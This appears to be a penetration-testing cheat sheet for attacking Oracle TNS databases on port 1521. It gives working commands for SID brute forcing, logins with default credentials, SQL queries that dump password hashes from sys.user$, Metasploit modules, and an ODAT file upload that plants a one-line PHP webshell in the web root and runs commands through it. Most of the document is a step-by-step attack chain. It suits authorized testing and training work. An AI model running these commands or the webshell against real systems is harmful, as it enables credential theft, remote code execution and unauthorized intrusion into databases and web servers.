# Oracle TNS (Port 1521)

Enumerate and exploit Oracle Transparent Network Substrate (TNS) and Oracle databases to dump credentials and upload files.
Oracle TNS facilitates communication between Oracle databases and applications, commonly found on enterprise database servers.

## Quick Reference

### Discover Oracle TNS
```bash
sudo nmap -p1521 -sV 10.10.10.10 --open
```

### Brute Force SID
```bash
sudo nmap -p1521 --script oracle-sid-brute 10.10.10.10
```

### Connect to Database
```bash
sqlplus scott/tiger@10.10.10.10/XE
```

## Enumeration

### Nmap Scripts
```bash
# Oracle TNS version
sudo nmap -p1521 -sV 10.10.10.10 --open

# SID brute force
sudo nmap -p1521 --script oracle-sid-brute 10.10.10.10

# TNS version
sudo nmap -p1521 --script oracle-tns-version 10.10.10.10
```

### ODAT (Oracle Database Attacking Tool)

#### Installation
```bash
# Download Oracle Instant Client
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip

# Extract
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip

# Set environment variables
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH

# Clone ODAT
git clone https://github.com/quentinhardy/odat.git
cd odat/

# Install dependencies
pip3 install cx_Oracle python-libnmap colorlog termcolor passlib pycryptodome
sudo apt-get install python3-scapy build-essential libgmp-dev -y

# Initialize submodules
git submodule init
git submodule update
```

#### Run All ODAT Modules
```bash
./odat.py all -s 10.10.10.10

# With credentials
./odat.py all -s 10.10.10.10 -d XE -U scott -P tiger
```

## SQLPlus Connection

### Basic Connection
```bash
# Connect with credentials
sqlplus scott/tiger@10.10.10.10/XE

# Connect as SYSDBA
sqlplus scott/tiger@10.10.10.10/XE as sysdba
```

### Fix Library Error
```bash
# If you get libsqlplus.so error
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

## Database Enumeration

### List Tables
```sql
-- List all tables
SELECT table_name FROM all_tables;

-- List user tables
SELECT table_name FROM user_tables;
```

### Check Privileges
```sql
-- Check user privileges
SELECT * FROM user_role_privs;

-- Check system privileges
SELECT * FROM user_sys_privs;
```

### Extract Password Hashes
```sql
-- Dump password hashes (requires SYSDBA)
SELECT name, password FROM sys.user$;

-- Alternative
SELECT username, password FROM dba_users;
```

### Enumerate Users
```sql
-- List all users
SELECT username FROM all_users;

-- List DBA users
SELECT username FROM dba_users;
```

## File Upload via ODAT

### Upload File to Web Root
```bash
# Create test file
echo "Oracle File Upload Test" > testing.txt

# Upload to Windows IIS
./odat.py utlfile -s 10.10.10.10 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Upload to Linux Apache
./odat.py utlfile -s 10.10.10.10 -d XE -U scott -P tiger --sysdba --putFile /var/www/html testing.txt ./testing.txt

# Verify upload
curl http://10.10.10.10/testing.txt
```

### Upload Webshell
```bash
# Create PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload webshell
./odat.py utlfile -s 10.10.10.10 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php

# Test webshell
curl http://10.10.10.10/shell.php?cmd=whoami
```

## Common Web Root Paths

| OS | Path |
|----|------|
| Linux | `/var/www/html` |
| Windows | `C:\inetpub\wwwroot` |

## SID Enumeration

### What is SID?
- SID (System Identifier) identifies the database instance
- Required for connection string
- Common SIDs: XE, ORCL, PROD, DEV

### Brute Force SID
```bash
# Nmap
sudo nmap -p1521 --script oracle-sid-brute 10.10.10.10

# ODAT
./odat.py sidguesser -s 10.10.10.10

# Metasploit
use auxiliary/scanner/oracle/sid_brute
set RHOSTS 10.10.10.10
run
```

## Default Credentials

### Common Oracle Accounts

| Username | Password | Description |
|----------|----------|-------------|
| sys | change_on_install | System account |
| system | manager | System account |
| scott | tiger | Demo account |
| dbsnmp | dbsnmp | SNMP account |
| sysman | sysman | Enterprise Manager |

## Metasploit Modules

### SID Enumeration
```bash
use auxiliary/scanner/oracle/sid_enum
set RHOSTS 10.10.10.10
run
```

### TNS Version
```bash
use auxiliary/scanner/oracle/tnspoison_checker
set RHOSTS 10.10.10.10
run
```

### Login Scanner
```bash
use auxiliary/scanner/oracle/oracle_login
set RHOSTS 10.10.10.10
set SID XE
run
```

## Configuration Files

### tnsnames.ora
```
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.10.10.10)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

### listener.ora
```
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.blackwood.com)(PORT = 1521))
    )
  )
```

## Common Workflow

### Full Oracle Assessment
```bash
# 1. Discover Oracle TNS
sudo nmap -p1521 -sV 10.10.10.10 --open

# 2. Brute force SID
sudo nmap -p1521 --script oracle-sid-brute 10.10.10.10

# 3. Run ODAT enumeration
./odat.py all -s 10.10.10.10

# 4. If credentials found, connect
sqlplus scott/tiger@10.10.10.10/XE

# 5. Check privileges
SELECT * FROM user_role_privs;

# 6. Try SYSDBA access
sqlplus scott/tiger@10.10.10.10/XE as sysdba

# 7. Extract password hashes
SELECT name, password FROM sys.user$;

# 8. Upload webshell if web server present
./odat.py utlfile -s 10.10.10.10 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php

# 9. Verify upload
curl http://10.10.10.10/shell.php?cmd=whoami
```

## Notes

**Oracle TNS:**
- Communication protocol for Oracle databases
- Port 1521 is default
- Requires SID to connect
- Can be remotely managed in Oracle 8i/9i

**SYSDBA Privilege:**
- Highest privilege level in Oracle
- Allows complete database control
- Can read/write any file
- Can extract all password hashes

**File Upload Requirements:**
- Need SYSDBA or DBA privileges
- Must know web root path
- Web server must be running
- File system permissions must allow writes

**Security Considerations:**
- Default credentials commonly unchanged
- SID can be brute forced
- SYSDBA access allows complete compromise
- File upload can lead to code execution
- Password hashes can be extracted and cracked

**Common Misconfigurations:**
- Default credentials (scott/tiger, sys/change_on_install)
- Weak passwords
- Unnecessary SYSDBA privileges
- TNS listener exposed to internet
- Outdated Oracle versions with known vulnerabilities

**Attack Surface:**
- Default credentials
- SID enumeration
- Password hash extraction
- File upload to web root
- SQL injection in applications
- TNS poisoning

**ODAT Capabilities:**
- SID enumeration
- Credential brute forcing
- Privilege enumeration
- Password hash extraction
- File upload/download
- Command execution
- Java stored procedure abuse
